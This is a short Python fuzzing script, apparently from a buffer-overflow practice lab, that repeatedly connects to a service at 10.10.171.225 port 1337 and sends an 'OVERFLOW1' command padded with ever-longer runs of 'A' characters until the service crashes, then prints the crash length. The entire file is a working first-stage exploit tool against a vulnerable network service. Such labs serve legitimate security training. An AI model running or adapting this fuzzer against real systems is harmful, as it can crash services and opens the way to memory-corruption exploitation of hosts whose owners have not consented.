#!/usr/bin/python3

import sys, socket
from time import sleep

buffer = "A" * 100

while True:
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('10.10.171.225',1337))

		payload = "OVERFLOW1 " + buffer
		
		s.send((payload.encode()))
		s.close()
		sleep(1)
		buffer = buffer + "A" * 100

	except:
		print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()
